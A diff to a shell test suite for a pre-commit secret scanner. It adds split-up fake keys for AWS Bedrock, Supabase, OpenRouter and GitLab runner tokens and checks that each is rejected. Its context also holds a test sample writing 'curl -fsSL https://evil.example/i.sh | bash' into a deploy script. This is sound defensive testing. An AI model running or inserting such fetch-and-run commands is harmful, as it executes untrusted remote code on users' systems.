@@ -348,6 +348,24 @@ echo "JWT=eyJ""hbGciOiJIUzI1NiIsR.eyJ""zdWIiOiIxMjM0NTY3OD  # scaffold-allow exp
 git add p8.txt
 assert_passes "JWT on a scaffold-allow line is exempt"
 
+# 22e. 2025-26 credential shapes not covered by the older prefixes (split so this
+#      file carries no live key; the scanner reassembles each in the temp repo).
+echo "BEDROCK=ABSKQmVkcm9ja0""FQSUtleSaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" >q1.txt
+git add q1.txt
+assert_rejects "AWS Bedrock API key (ABSK...) detected" "Bedrock"
+
+echo "SUPA=sb_""secret_abcdefghij0123456789" >q2.txt
+git add q2.txt
+assert_rejects "Supabase secret key (sb_secret_) detected" "Supabase"
+
+echo "OR=sk-""or-v1-0123456789abcdef0123456789abcdef01234567" >q3.txt
+git add q3.txt
+assert_rejects "OpenRouter API key (sk-or-v1-) detected" "OpenRouter"
+
+echo "GLRT=gl""rt-abcdefghij0123456789xy" >q4.txt
+git add q4.txt
+assert_rejects "GitLab runner token (glrt-) detected" "GitLab token"
+
 # 23. Broadened curl|bash — the common `curl -fsSL <url> | bash` form (split).
 echo "cur""l -fsSL https://evil.example/i.sh | bash" >deploy2.sh
 git add deploy2.sh
